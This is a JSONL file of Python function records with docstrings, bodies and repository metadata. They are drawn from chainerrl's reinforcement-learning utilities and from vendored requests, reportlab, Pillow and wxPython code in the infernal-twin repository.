{"docstring": "# Stabilize training by large eps\n", "func_signal": "def make_optimizer(self, env, q_func):\n", "code": "opt = optimizers.Adam(1e-2, eps=1)\nopt.setup(q_func)\nreturn opt", "path": "chainerrl/tests/agents_tests/basetest_dqn_like.py", "commit_date": "2019-08-26 00:00:00", "repo_name": "chainer/chainerrl", "stars": 1147, "license": "mit", "language": "python", "size": 14530}
{"docstring": "\"\"\"Set shared params (and persistent values) to a link.\n\nArgs:\n  a (chainer.Link): link whose params are to be replaced\n  b (dict): dict that consists of (param_name, multiprocessing.Array)\n\"\"\"\n", "func_signal": "def set_shared_params(a, b):\n", "code": "assert isinstance(a, chainer.Link)\nremaining_keys = set(b.keys())\nfor param_name, param in a.namedparams():\n    if param_name in b:\n        shared_param = b[param_name]\n        param.array = np.frombuffer(\n            shared_param, dtype=param.dtype).reshape(param.shape)\n        remaining_keys.remove(param_name)\nfor persistent_name, _ in chainerrl.misc.namedpersistent(a):\n    if persistent_name in b:\n        _set_persistent_values_recursively(\n            a, persistent_name, b[persistent_name])\n        remaining_keys.remove(persistent_name)\nassert not remaining_keys", "path": "chainerrl/chainerrl/misc/async_.py", "commit_date": "2019-12-11 00:00:00", "repo_name": "chainer/chainerrl", "stars": 1147, "license": "mit", "language": "python", "size": 14530}
{"docstring": "\"\"\"Return True iff a given layer is recurrent and supported by ChainerRL.\n\nArgs:\n    layer (callable): Any callable object.\n\nReturns:\n    bool: True iff a given layer is recurrent and supported by ChainerRL.\n\"\"\"\n", "func_signal": "def is_recurrent_link(layer):\n", "code": "return isinstance(layer, (\n    L.NStepLSTM,\n    L.NStepGRU,\n    L.NStepRNNReLU,\n    L.NStepRNNTanh,\n    StatelessRecurrent,\n))", "path": "chainerrl/chainerrl/links/stateless_recurrent.py", "commit_date": "2019-07-31 00:00:00", "repo_name": "chainer/chainerrl", "stars": 1147, "license": "mit", "language": "python", "size": 14530}
{"docstring": "\"\"\"Make a link's params not shared.\n\nArgs:\n  a (chainer.Link): link whose params are to be made not shared\n\"\"\"\n", "func_signal": "def make_params_not_shared(a):\n", "code": "assert isinstance(a, chainer.Link)\nfor param in a.params():\n    param.array = param.array.copy()", "path": "chainerrl/chainerrl/misc/async_.py", "commit_date": "2019-12-11 00:00:00", "repo_name": "chainer/chainerrl", "stars": 1147, "license": "mit", "language": "python", "size": 14530}
{"docstring": "\"\"\"Concatenate sequences.\n\nArgs:\n    sequences (list): List of sequences. The following two cases are\n        supported:\n            - (a) Each sequence is a Variable or ndarray.\n            - (b) Each sequence is tuple of a Variable or ndarray.\n\nReturns:\n    chainer.Variable, ndarray or tuple: Concatenated sequences.\n\"\"\"\n", "func_signal": "def concatenate_sequences(sequences):\n", "code": "if isinstance(sequences[0], tuple):\n    tuple_size = len(sequences[0])\n    return tuple(\n        F.concat([seq[i] for seq in sequences], axis=0)\n        for i in range(tuple_size))\n    raise NotImplementedError\nelse:\n    return F.concat(sequences, axis=0)", "path": "chainerrl/chainerrl/links/stateless_recurrent.py", "commit_date": "2019-07-31 00:00:00", "repo_name": "chainer/chainerrl", "stars": 1147, "license": "mit", "language": "python", "size": 14530}
{"docstring": "\"\"\"Copy parameters of a link to another link.\"\"\"\n", "func_signal": "def copy_param(target_link, source_link):\n", "code": "target_params = dict(target_link.namedparams())\nfor param_name, param in source_link.namedparams():\n    if target_params[param_name].array is None:\n        raise TypeError(\n            'target_link parameter {} is None. Maybe the model params are '\n            'not initialized.\\nPlease try to forward dummy input '\n            'beforehand to determine parameter shape of the model.'.format(\n                param_name))\n    target_params[param_name].array[...] = param.array\n\n# Copy Batch Normalization's statistics\ntarget_links = dict(target_link.namedlinks())\nfor link_name, link in source_link.namedlinks():\n    if isinstance(link, L.BatchNormalization):\n        target_bn = target_links[link_name]\n        target_bn.avg_mean[...] = link.avg_mean\n        target_bn.avg_var[...] = link.avg_var", "path": "chainerrl/chainerrl/misc/copy_param.py", "commit_date": "2019-12-11 00:00:00", "repo_name": "chainer/chainerrl", "stars": 1147, "license": "mit", "language": "python", "size": 14530}
{"docstring": "\"\"\"Return recurrent child links.\n\nReturns:\n    tuple: Tuple of `chainer.Link`s that are recurrent.\n\"\"\"\n", "func_signal": "def recurrent_children(self):\n", "code": "return tuple(child for child in self.children()\n             if is_recurrent_link(child))", "path": "chainerrl/chainerrl/links/stateless_recurrent.py", "commit_date": "2019-07-31 00:00:00", "repo_name": "chainer/chainerrl", "stars": 1147, "license": "mit", "language": "python", "size": 14530}
{"docstring": "\"\"\"Run experiments asynchronously.\n\nArgs:\n  n_process (int): number of processes\n  run_func: function that will be run in parallel\n\"\"\"\n\n", "func_signal": "def run_async(n_process, run_func):\n", "code": "processes = []\n\ndef set_seed_and_run(process_idx, run_func):\n    random_seed.set_random_seed(np.random.randint(0, 2 ** 32))\n    run_func(process_idx)\n\nfor process_idx in range(n_process):\n    processes.append(mp.Process(target=set_seed_and_run, args=(\n        process_idx, run_func)))\n\nfor p in processes:\n    p.start()\n\nfor process_idx, p in enumerate(processes):\n    p.join()\n    if p.exitcode > 0:\n        warnings.warn(\n            \"Process #{} (pid={}) exited with nonzero status {}\".format(\n                process_idx, p.pid, p.exitcode),\n            category=AbnormalExitWarning,\n        )\n    elif p.exitcode < 0:\n        warnings.warn(\n            \"Process #{} (pid={}) was terminated by signal {}\".format(\n                process_idx, p.pid, -p.exitcode),\n            category=AbnormalExitWarning,\n        )", "path": "chainerrl/chainerrl/misc/async_.py", "commit_date": "2019-12-11 00:00:00", "repo_name": "chainer/chainerrl", "stars": 1147, "license": "mit", "language": "python", "size": 14530}
{"docstring": "\"\"\"Call a recurrent link following the interface of `StatelessRecurrent`.\n\nArgs:\n    link (chainer.Link): Recurrent link.\n    sequences, recurrent_state, output_mode: See the docstring of\n        `StatelessRecurrent.n_step_forward`.\n\nReturns:\n    object: Output sequences. See the docstring of\n        `StatelessRecurrent.n_step_forward`.\n    object: New batched recurrent state.\n\"\"\"\n", "func_signal": "def call_recurrent_link(link, sequences, recurrent_state, output_mode):\n", "code": "assert isinstance(link, chainer.Link)\nassert isinstance(sequences, list)\nif isinstance(link, L.NStepLSTM):\n    if recurrent_state is None:\n        h = None\n        c = None\n    else:\n        h, c = recurrent_state\n    h, c, sequences = link(h, c, sequences)\n    if output_mode == 'concat':\n        sequences = concatenate_sequences(sequences)\n    return sequences, (h, c)\nif isinstance(link, (L.NStepGRU, L.NStepRNNReLU, L.NStepRNNTanh)):\n    h = recurrent_state\n    h, sequences = link(h, sequences)\n    if output_mode == 'concat':\n        sequences = concatenate_sequences(sequences)\n    return sequences, h\nif isinstance(link, StatelessRecurrent):\n    return link.n_step_forward(\n        sequences, recurrent_state, output_mode=output_mode)\nelse:\n    raise ValueError('{} is not a recurrent link'.format(link))", "path": "chainerrl/chainerrl/links/stateless_recurrent.py", "commit_date": "2019-07-31 00:00:00", "repo_name": "chainer/chainerrl", "stars": 1147, "license": "mit", "language": "python", "size": 14530}
{"docstring": "\"\"\"Split concatenated sequences.\n\nArgs:\n    xs (chainer.Variable, ndarray or tuple): Concatenated sequences.\n    sections (array-like): Sections as indices indicating start positions\n        of sequences.\n\nReturns:\n    list: List of sequences.\n\"\"\"\n", "func_signal": "def split_batched_sequences(xs, sections):\n", "code": "if isinstance(xs, tuple):\n    return list(zip(*[split_batched_sequences(x, sections) for x in xs]))\nelse:\n    return list(F.split_axis(xs, sections, axis=0))", "path": "chainerrl/chainerrl/links/stateless_recurrent.py", "commit_date": "2019-07-31 00:00:00", "repo_name": "chainer/chainerrl", "stars": 1147, "license": "mit", "language": "python", "size": 14530}
{"docstring": "\"\"\"Soft-copy parameters of a link to another link.\"\"\"\n", "func_signal": "def soft_copy_param(target_link, source_link, tau):\n", "code": "target_params = dict(target_link.namedparams())\nfor param_name, param in source_link.namedparams():\n    if target_params[param_name].array is None:\n        raise TypeError(\n            'target_link parameter {} is None. Maybe the model params are '\n            'not initialized.\\nPlease try to forward dummy input '\n            'beforehand to determine parameter shape of the model.'.format(\n                param_name))\n    target_params[param_name].array[...] *= (1 - tau)\n    target_params[param_name].array[...] += tau * param.array\n\n# Soft-copy Batch Normalization's statistics\ntarget_links = dict(target_link.namedlinks())\nfor link_name, link in source_link.namedlinks():\n    if isinstance(link, L.BatchNormalization):\n        target_bn = target_links[link_name]\n        target_bn.avg_mean[...] *= (1 - tau)\n        target_bn.avg_mean[...] += tau * link.avg_mean\n        target_bn.avg_var[...] *= (1 - tau)\n        target_bn.avg_var[...] += tau * link.avg_var", "path": "chainerrl/chainerrl/misc/copy_param.py", "commit_date": "2019-12-11 00:00:00", "repo_name": "chainer/chainerrl", "stars": 1147, "license": "mit", "language": "python", "size": 14530}
{"docstring": "# Use different random seeds for train and test envs\n", "func_signal": "def make_env(test):\n", "code": "env_seed = test_seed if test else train_seed\nenv = atari_wrappers.wrap_deepmind(\n    atari_wrappers.make_atari(args.env, max_frames=None),\n    episode_life=not test,\n    clip_rewards=not test)\nenv.seed(int(env_seed))\nif test:\n    # Randomize actions like epsilon-greedy in evaluation as well\n    env = chainerrl.wrappers.RandomizeAction(env, 0.05)\nif args.monitor:\n    env = chainerrl.wrappers.Monitor(\n        env, args.outdir,\n        mode='evaluation' if test else 'training')\nif args.render:\n    env = chainerrl.wrappers.Render(env)\nreturn env", "path": "chainerrl/examples/atari/reproduction/dqn/train_dqn.py", "commit_date": "2019-12-16 00:00:00", "repo_name": "chainer/chainerrl", "stars": 1147, "license": "mit", "language": "python", "size": 14530}
{"docstring": "\"\"\"Split one-step batch input.\n\nArgs:\n    xs (chainer.Variable, ndarray or tuple): One-step batched input. It\n        should be either:\n            - a variable whose first axis is the batch axis.\n            - a tuple of such variables.\n\nReturns:\n    list: Either a list of variables or a list of tuples of varialbes.\n        The length of the list is the batch size of the input.\n\"\"\"\n", "func_signal": "def split_one_step_batch_input(xs):\n", "code": "if isinstance(xs, tuple):\n    return list(zip(*[split_one_step_batch_input(x) for x in xs]))\nelse:\n    return list(F.split_axis(xs, len(xs), axis=0))", "path": "chainerrl/chainerrl/links/stateless_recurrent.py", "commit_date": "2019-07-31 00:00:00", "repo_name": "chainer/chainerrl", "stars": 1147, "license": "mit", "language": "python", "size": 14530}
{"docstring": "# begin wxGlade: MyFrame.__set_properties\n", "func_signal": "def __set_properties(self):\n", "code": "self.SetTitle(\"Notepad\")\n# self.frame_1_toolbar.SetToolBitmapSize((0, 0))\n# self.frame_1_toolbar.Realize()\nself.frame_1_statusbar.SetStatusWidths([-1])\n# statusbar fields\nframe_1_statusbar_fields = [\"frame_1_statusbar\"]\nfor i in range(len(frame_1_statusbar_fields)):\n    self.frame_1_statusbar.SetStatusText(frame_1_statusbar_fields[i], i)\n# end wxGlade", "path": "infernal-twin/Modules/notepad.py", "commit_date": "2018-09-14 00:00:00", "repo_name": "entropy1337/infernal-twin", "stars": 1207, "license": "None", "language": "python", "size": 15705}
{"docstring": "'''\nUseful for interpreting short descriptions of paddings, borders, margin, etc.\nExpects a single value or a tuple of length 2 to 4.\nReturns a tuple representing (clockwise) the value(s) applied to the 4 sides of a rectangle:\nIf a single value is given, that value is applied to all four sides.\nIf two or three values are given, the missing values are taken from the opposite side(s).\nIf four values are given they are returned unchanged.\n\n>>> normalizeTRBL(1)\n(1, 1, 1, 1)\n>>> normalizeTRBL((1, 1.2))\n(1, 1.2, 1, 1.2)\n>>> normalizeTRBL((1, 1.2, 0))\n(1, 1.2, 0, 1.2)\n>>> normalizeTRBL((1, 1.2, 0, 8))\n(1, 1.2, 0, 8)\n'''\n", "func_signal": "def normalizeTRBL(p):\n", "code": "if not isinstance(p, (tuple, list)):\n    return (p,)*4\nl = len(p)\nif l < 2 or l > 4:\n    raise ValueError('A padding must have between 2 and 4 values but got %d.' % l)\nreturn tuple(p) + tuple([ p[i-2] for i in range(l, 4) ])", "path": "infernal-twin/Modules/build/reportlab/build/lib.linux-i686-2.7/reportlab/lib/geomutils.py", "commit_date": "2018-09-14 00:00:00", "repo_name": "entropy1337/infernal-twin", "stars": 1207, "license": "None", "language": "python", "size": 15705}
{"docstring": "# begin wxGlade: MyFrame.__do_layout\n", "func_signal": "def __do_layout(self):\n", "code": "sizer_1 = wx.BoxSizer(wx.VERTICAL)\nself.SetAutoLayout(True)\nself.SetSizer(sizer_1)\nsizer_1.Fit(self)\nsizer_1.SetSizeHints(self)\nself.Layout()", "path": "infernal-twin/Modules/notepad.py", "commit_date": "2018-09-14 00:00:00", "repo_name": "entropy1337/infernal-twin", "stars": 1207, "license": "None", "language": "python", "size": 15705}
{"docstring": "'''return series name i or default'''\n", "func_signal": "def getSeriesName(self,i,default=None):\n", "code": "try:\n    text = _objStr(self.labels[i])\nexcept:\n    text = default\nif not self.simpleLabels:\n    _text = getattr(self.slices[i],'label_text','')\n    if _text is not None: text = _text\nreturn text", "path": "infernal-twin/Modules/build/reportlab/src/reportlab/graphics/charts/piecharts.py", "commit_date": "2018-09-14 00:00:00", "repo_name": "entropy1337/infernal-twin", "stars": 1207, "license": "None", "language": "python", "size": 15705}
{"docstring": "\"\"\"Return urllib3 ProxyManager for the given proxy.\n\nThis method should not be called from user code, and is only\nexposed for use when subclassing the\n:class:`HTTPAdapter <requests.adapters.HTTPAdapter>`.\n\n:param proxy: The proxy to return a urllib3 ProxyManager for.\n:param proxy_kwargs: Extra keyword arguments used to configure the Proxy Manager.\n:returns: ProxyManager\n\"\"\"\n", "func_signal": "def proxy_manager_for(self, proxy, **proxy_kwargs):\n", "code": "if not proxy in self.proxy_manager:\n    proxy_headers = self.proxy_headers(proxy)\n    self.proxy_manager[proxy] = proxy_from_url(\n        proxy,\n        proxy_headers=proxy_headers,\n        num_pools=self._pool_connections,\n        maxsize=self._pool_maxsize,\n        block=self._pool_block,\n        **proxy_kwargs)\n\nreturn self.proxy_manager[proxy]", "path": "infernal-twin/Modules/build/pip/build/lib.linux-i686-2.7/pip/_vendor/requests/adapters.py", "commit_date": "2018-09-14 00:00:00", "repo_name": "entropy1337/infernal-twin", "stars": 1207, "license": "None", "language": "python", "size": 15705}
{"docstring": "# Test CMYK handling.  Thanks to Tim and Charlie for test data,\n# Michael for getting me to look one more time.\n", "func_signal": "def test_cmyk(self):\n", "code": "f = \"Tests/images/pil_sample_cmyk.jpg\"\nim = Image.open(f)\n# the source image has red pixels in the upper left corner.\nc, m, y, k = [x / 255.0 for x in im.getpixel((0, 0))]\nself.assertEqual(c, 0.0)\nself.assertGreater(m, 0.8)\nself.assertGreater(y, 0.8)\nself.assertEqual(k, 0.0)\n# the opposite corner is black\nc, m, y, k = [x / 255.0 for x in im.getpixel((\n    im.size[0]-1, im.size[1]-1))]\nself.assertGreater(k, 0.9)\n# roundtrip, and check again\nim = self.roundtrip(im)\nc, m, y, k = [x / 255.0 for x in im.getpixel((0, 0))]\nself.assertEqual(c, 0.0)\nself.assertGreater(m, 0.8)\nself.assertGreater(y, 0.8)\nself.assertEqual(k, 0.0)\nc, m, y, k = [x / 255.0 for x in im.getpixel((\n    im.size[0]-1, im.size[1]-1))]\nself.assertGreater(k, 0.9)", "path": "infernal-twin/Modules/build/pillow/Tests/test_file_jpeg.py", "commit_date": "2018-09-14 00:00:00", "repo_name": "entropy1337/infernal-twin", "stars": 1207, "license": "None", "language": "python", "size": 15705}
{"docstring": "# https://github.com/python-pillow/Pillow/issues/148\n", "func_signal": "def test_optimize_large_buffer(self):\n", "code": "f = self.tempfile('temp.jpg')\n# this requires ~ 1.5x Image.MAXBLOCK\nim = Image.new(\"RGB\", (4096, 4096), 0xff3333)\nim.save(f, format=\"JPEG\", optimize=True)", "path": "infernal-twin/Modules/build/pillow/Tests/test_file_jpeg.py", "commit_date": "2018-09-14 00:00:00", "repo_name": "entropy1337/infernal-twin", "stars": 1207, "license": "None", "language": "python", "size": 15705}
{"docstring": "# Can't handle by adding 'proxy_manager' to self.__attrs__ because\n# because self.poolmanager uses a lambda function, which isn't pickleable.\n", "func_signal": "def __setstate__(self, state):\n", "code": "self.proxy_manager = {}\nself.config = {}\n\nfor attr, value in state.items():\n    setattr(self, attr, value)\n\nself.init_poolmanager(self._pool_connections, self._pool_maxsize,\n                      block=self._pool_block)", "path": "infernal-twin/Modules/build/pip/build/lib.linux-i686-2.7/pip/_vendor/requests/adapters.py", "commit_date": "2018-09-14 00:00:00", "repo_name": "entropy1337/infernal-twin", "stars": 1207, "license": "None", "language": "python", "size": 15705}
{"docstring": "# begin wxGlade: MyFrame.__init__\n", "func_signal": "def __init__(self, *args, **kwds):\n", "code": "kwds[\"style\"] = wx.DEFAULT_FRAME_STYLE\nwx.Frame.__init__(self, *args, **kwds)\n# wx.Frame.__init__(self, parent, -1, title, pos=(150, 150), size=(350, 250))\nself.flag = 0\n# Menu Bar\nself.frame_1_menubar = wx.MenuBar()\nself.SetMenuBar(self.frame_1_menubar)\nself.File = wx.Menu()\nself.New = wx.MenuItem(self.File, wx.NewId(), \"&New\", \"\", wx.ITEM_NORMAL)\nself.File.AppendItem(self.New)\nself.Save = wx.MenuItem(self.File, wx.NewId(), \"Save &As\", \"\", wx.ITEM_NORMAL)\nself.File.AppendItem(self.Save)\nself.open = wx.MenuItem(self.File, wx.NewId(), \"&Open\", \"\", wx.ITEM_NORMAL)\nself.File.AppendItem(self.open)\nself.About = wx.MenuItem(self.File, wx.NewId(), \"A&bout\", \"\", wx.ITEM_NORMAL)\nself.File.AppendItem(self.About)\nself.Exit = wx.MenuItem(self.File, wx.NewId(), \"&Exit\", \"\", wx.ITEM_NORMAL)\nself.File.AppendItem(self.Exit)\nself.frame_1_menubar.Append(self.File, \"&File\")\n# Menu Bar end\n# Tool Bar\n# self.frame_1_toolbar = wx.ToolBar(self, -1, style=wx.TB_HORIZONTAL|wx.TB_FLAT|wx.TB_DOCKABLE|wx.TB_3DBUTTONS|wx.TB_TEXT|wx.TB_NOICONS|wx.TB_NODIVIDER|wx.TB_NOALIGN|wx.TB_HORZ_LAYOUT|wx.TB_HORZ_TEXT)\n# self.SetToolBar(self.frame_1_toolbar)\n# Tool Bar end\nself.frame_1_statusbar = self.CreateStatusBar(1, 0)\nself.__set_properties()\nself.__do_layout()\nself.SetStatusText(\"Notepad \")\nself.Bind(wx.EVT_MENU, self.file_save, self.Save)\nself.Bind(wx.EVT_MENU, self.open_file, self.open)\nself.Bind(wx.EVT_MENU, self.file_new, self.New)\nself.Bind(wx.EVT_MENU, self.file_exit, self.Exit)\nself.Bind(wx.EVT_MENU, self.about, self.About)", "path": "infernal-twin/Modules/notepad.py", "commit_date": "2018-09-14 00:00:00", "repo_name": "entropy1337/infernal-twin", "stars": 1207, "license": "None", "language": "python", "size": 15705}
{"docstring": "\"\"\"Obtain the url to use when making the final request.\n\nIf the message is being sent through a HTTP proxy, the full URL has to\nbe used. Otherwise, we should only use the path portion of the URL.\n\nThis should not be called from user code, and is only exposed for use\nwhen subclassing the\n:class:`HTTPAdapter <requests.adapters.HTTPAdapter>`.\n\n:param request: The :class:`PreparedRequest <PreparedRequest>` being sent.\n:param proxies: A dictionary of schemes to proxy URLs.\n\"\"\"\n", "func_signal": "def request_url(self, request, proxies):\n", "code": "proxies = proxies or {}\nscheme = urlparse(request.url).scheme\nproxy = proxies.get(scheme)\n\nif proxy and scheme != 'https':\n    url = urldefragauth(request.url)\nelse:\n    url = request.path_url\n\nreturn url", "path": "infernal-twin/Modules/build/pip/build/lib.linux-i686-2.7/pip/_vendor/requests/adapters.py", "commit_date": "2018-09-14 00:00:00", "repo_name": "entropy1337/infernal-twin", "stars": 1207, "license": "None", "language": "python", "size": 15705}
{"docstring": "\"\"\"Builds a :class:`Response <requests.Response>` object from a urllib3\nresponse. This should not be called from user code, and is only exposed\nfor use when subclassing the\n:class:`HTTPAdapter <requests.adapters.HTTPAdapter>`\n\n:param req: The :class:`PreparedRequest <PreparedRequest>` used to generate the response.\n:param resp: The urllib3 response object.\n\"\"\"\n", "func_signal": "def build_response(self, req, resp):\n", "code": "response = Response()\n\n# Fallback to None if there's no status_code, for whatever reason.\nresponse.status_code = getattr(resp, 'status', None)\n\n# Make headers case-insensitive.\nresponse.headers = CaseInsensitiveDict(getattr(resp, 'headers', {}))\n\n# Set encoding.\nresponse.encoding = get_encoding_from_headers(response.headers)\nresponse.raw = resp\nresponse.reason = response.raw.reason\n\nif isinstance(req.url, bytes):\n    response.url = req.url.decode('utf-8')\nelse:\n    response.url = req.url\n\n# Add new cookies from the server.\nextract_cookies_to_jar(response.cookies, req, resp)\n\n# Give the Response some context.\nresponse.request = req\nresponse.connection = self\n\nreturn response", "path": "infernal-twin/Modules/build/pip/build/lib.linux-i686-2.7/pip/_vendor/requests/adapters.py", "commit_date": "2018-09-14 00:00:00", "repo_name": "entropy1337/infernal-twin", "stars": 1207, "license": "None", "language": "python", "size": 15705}
{"docstring": "# now draw a label\n", "func_signal": "def _addWedgeLabel(self,text,angle,labelX,labelY,wedgeStyle,labelClass=WedgeLabel):\n", "code": "if self.simpleLabels:\n    theLabel = String(labelX, labelY, text)\n    if not self.sideLabels:\n        theLabel.textAnchor = \"middle\"\n    else:\n        if (abs(angle) < 90 ) or (angle >270 and angle<450) or (-450< angle <-270):\n            theLabel.textAnchor = \"start\"\n        else:\n            theLabel.textAnchor = \"end\"\n    theLabel._pmv = angle\n    theLabel._simple_pointer = 0\nelse:\n    theLabel = labelClass()\n    theLabel._pmv = angle\n    theLabel.x = labelX\n    theLabel.y = labelY\n    theLabel.dx = wedgeStyle.label_dx\n    if not self.sideLabels:\n        theLabel.dy = wedgeStyle.label_dy\n        theLabel.boxAnchor = wedgeStyle.label_boxAnchor\n    else:\n        if wedgeStyle.fontSize is None:\n            sideLabels_dy = self.fontSize / 2.5\n        else:\n            sideLabels_dy = wedgeStyle.fontSize / 2.5\n        if wedgeStyle.label_dy is None:\n            theLabel.dy = sideLabels_dy\n        else:\n            theLabel.dy = wedgeStyle.label_dy + sideLabels_dy\n        if (abs(angle) < 90 ) or (angle >270 and angle<450) or (-450< angle <-270):\n            theLabel.boxAnchor = 'w'\n        else:\n            theLabel.boxAnchor = 'e'\n    theLabel.angle = wedgeStyle.label_angle\n    theLabel.boxStrokeColor = wedgeStyle.label_boxStrokeColor\n    theLabel.boxStrokeWidth = wedgeStyle.label_boxStrokeWidth\n    theLabel.boxFillColor = wedgeStyle.label_boxFillColor\n    theLabel.strokeColor = wedgeStyle.label_strokeColor\n    theLabel.strokeWidth = wedgeStyle.label_strokeWidth\n    _text = wedgeStyle.label_text\n    if _text is None: _text = text\n    theLabel._text = _text\n    theLabel.leading = wedgeStyle.label_leading\n    theLabel.width = wedgeStyle.label_width\n    theLabel.maxWidth = wedgeStyle.label_maxWidth\n    theLabel.height = wedgeStyle.label_height\n    theLabel.textAnchor = wedgeStyle.label_textAnchor\n    theLabel.visible = wedgeStyle.label_visible\n    theLabel.topPadding = wedgeStyle.label_topPadding\n    theLabel.leftPadding = wedgeStyle.label_leftPadding\n    theLabel.rightPadding = wedgeStyle.label_rightPadding\n    theLabel.bottomPadding = wedgeStyle.label_bottomPadding\n    theLabel._simple_pointer = wedgeStyle.label_simple_pointer\ntheLabel.fontSize = wedgeStyle.fontSize\ntheLabel.fontName = wedgeStyle.fontName\ntheLabel.fillColor = wedgeStyle.fontColor\nreturn theLabel", "path": "infernal-twin/Modules/build/reportlab/src/reportlab/graphics/charts/piecharts.py", "commit_date": "2018-09-14 00:00:00", "repo_name": "entropy1337/infernal-twin", "stars": 1207, "license": "None", "language": "python", "size": 15705}
{"docstring": "\"\"\"Initializes a urllib3 PoolManager.\n\nThis method should not be called from user code, and is only\nexposed for use when subclassing the\n:class:`HTTPAdapter <requests.adapters.HTTPAdapter>`.\n\n:param connections: The number of urllib3 connection pools to cache.\n:param maxsize: The maximum number of connections to save in the pool.\n:param block: Block when no free connections are available.\n:param pool_kwargs: Extra keyword arguments used to initialize the Pool Manager.\n\"\"\"\n# save these values for pickling\n", "func_signal": "def init_poolmanager(self, connections, maxsize, block=DEFAULT_POOLBLOCK, **pool_kwargs):\n", "code": "self._pool_connections = connections\nself._pool_maxsize = maxsize\nself._pool_block = block\n\nself.poolmanager = PoolManager(num_pools=connections, maxsize=maxsize,\n                               block=block, strict=True, **pool_kwargs)", "path": "infernal-twin/Modules/build/pip/build/lib.linux-i686-2.7/pip/_vendor/requests/adapters.py", "commit_date": "2018-09-14 00:00:00", "repo_name": "entropy1337/infernal-twin", "stars": 1207, "license": "None", "language": "python", "size": 15705}
{"docstring": "'''find overlap run containing B[i]'''\n", "func_signal": "def _findOverlapRun(B,i,wrap):\n", "code": "n = len(B)\nR = [i]\nwhile 1:\n    i = R[-1]\n    j = (i+1)%n\n    if j in R or not boundsOverlap(B[i],B[j]): break\n    R.append(j)\nwhile 1:\n    i = R[0]\n    j = (i-1)%n\n    if j in R or not boundsOverlap(B[i],B[j]): break\n    R.insert(0,j)\nreturn R", "path": "infernal-twin/Modules/build/reportlab/src/reportlab/graphics/charts/piecharts.py", "commit_date": "2018-09-14 00:00:00", "repo_name": "entropy1337/infernal-twin", "stars": 1207, "license": "None", "language": "python", "size": 15705}
{"docstring": "# Make sure that the \"extra\" support handles large blocks\n", "func_signal": "def test_icc_big(self):\n", "code": "def test(n):\n    # The ICC APP marker can store 65519 bytes per marker, so\n    # using a 4-byte test code should allow us to detect out of\n    # order issues.\n    icc_profile = (b\"Test\"*int(n/4+1))[:n]\n    assert len(icc_profile) == n  # sanity\n    im1 = self.roundtrip(hopper(), icc_profile=icc_profile)\n    self.assertEqual(im1.info.get(\"icc_profile\"), icc_profile or None)\ntest(0)\ntest(1)\ntest(3)\ntest(4)\ntest(5)\ntest(65533-14)  # full JPEG marker block\ntest(65533-14+1)  # full block plus one byte\ntest(ImageFile.MAXBLOCK)  # full buffer block\ntest(ImageFile.MAXBLOCK+1)  # full buffer block plus one byte\ntest(ImageFile.MAXBLOCK*4+3)  # large block", "path": "infernal-twin/Modules/build/pillow/Tests/test_file_jpeg.py", "commit_date": "2018-09-14 00:00:00", "repo_name": "entropy1337/infernal-twin", "stars": 1207, "license": "None", "language": "python", "size": 15705}
{"docstring": "# Test APP/COM reader (@PIL135)\n", "func_signal": "def test_app(self):\n", "code": "im = Image.open(TEST_FILE)\nself.assertEqual(\n    im.applist[0],\n    (\"APP0\", b\"JFIF\\x00\\x01\\x01\\x01\\x00`\\x00`\\x00\\x00\"))\nself.assertEqual(im.applist[1], (\n    \"COM\", b\"File written by Adobe Photoshop\\xa8 4.0\\x00\"))\nself.assertEqual(len(im.applist), 2)", "path": "infernal-twin/Modules/build/pillow/Tests/test_file_jpeg.py", "commit_date": "2018-09-14 00:00:00", "repo_name": "entropy1337/infernal-twin", "stars": 1207, "license": "None", "language": "python", "size": 15705}
{"docstring": "'''determine a set of overlaps in bounding boxes B or return None'''\n", "func_signal": "def findOverlapRun(B,wrap=1):\n", "code": "n = len(B)\nif n>1:\n    for i in range(n-1):\n        R = _findOverlapRun(B,i,wrap)\n        if len(R)>1: return R\nreturn None", "path": "infernal-twin/Modules/build/reportlab/src/reportlab/graphics/charts/piecharts.py", "commit_date": "2018-09-14 00:00:00", "repo_name": "entropy1337/infernal-twin", "stars": 1207, "license": "None", "language": "python", "size": 15705}
{"docstring": "\"\"\"Detect Level 1 and 2 headings, build outline,\nand track chapter title.\"\"\"\n\n", "func_signal": "def afterFlowable(self, flowable):\n", "code": "if isinstance(flowable, Paragraph):\n    style = flowable.style.name\n    txt = flowable.getPlainText()\n\n    if style == 'Title':\n        self.title = txt\n    elif style == 'Heading1':\n        self.chapter = txt \n        key = 'ch%s' % self.seq.nextf('chapter')\n        self.canv.bookmarkPage(key)\n        self.canv.addOutlineEntry(txt, key, 0, 0)\n        self.seq.reset(\"section\")\n        self.notify('TOCEntry', (0, txt, self.page, key))\n    elif style == 'Heading2':\n        self.section = flowable.text\n        key = 'ch%ss%s' % (self.seq.thisf(\"chapter\"), self.seq.nextf(\"section\"))\n        self.canv.bookmarkPage(key)\n        self.canv.addOutlineEntry(txt, key, 1, 0)\n        self.notify('TOCEntry', (1, txt, self.page, key))", "path": "infernal-twin/Modules/build/reportlab/tools/docco/rltemplate.py", "commit_date": "2018-09-14 00:00:00", "repo_name": "entropy1337/infernal-twin", "stars": 1207, "license": "None", "language": "python", "size": 15705}
{"docstring": "# Arrange\n", "func_signal": "def test_no_duplicate_0x1001_tag(self):\n", "code": "from PIL import ExifTags\ntag_ids = dict(zip(ExifTags.TAGS.values(), ExifTags.TAGS.keys()))\n\n# Assert\nself.assertEqual(tag_ids['RelatedImageWidth'], 0x1001)\nself.assertEqual(tag_ids['RelatedImageLength'], 0x1002)", "path": "infernal-twin/Modules/build/pillow/Tests/test_file_jpeg.py", "commit_date": "2018-09-14 00:00:00", "repo_name": "entropy1337/infernal-twin", "stars": 1207, "license": "None", "language": "python", "size": 15705}
{"docstring": "# Test ICC support\n", "func_signal": "def test_icc(self):\n", "code": "im1 = Image.open(\"Tests/images/rgb.jpg\")\nicc_profile = im1.info[\"icc_profile\"]\nself.assertEqual(len(icc_profile), 3144)\n# Roundtrip via physical file.\nf = self.tempfile(\"temp.jpg\")\nim1.save(f, icc_profile=icc_profile)\nim2 = Image.open(f)\nself.assertEqual(im2.info.get(\"icc_profile\"), icc_profile)\n# Roundtrip via memory buffer.\nim1 = self.roundtrip(hopper())\nim2 = self.roundtrip(hopper(), icc_profile=icc_profile)\nself.assert_image_equal(im1, im2)\nself.assertFalse(im1.info.get(\"icc_profile\"))\nself.assertTrue(im2.info.get(\"icc_profile\"))", "path": "infernal-twin/Modules/build/pillow/Tests/test_file_jpeg.py", "commit_date": "2018-09-14 00:00:00", "repo_name": "entropy1337/infernal-twin", "stars": 1207, "license": "None", "language": "python", "size": 15705}
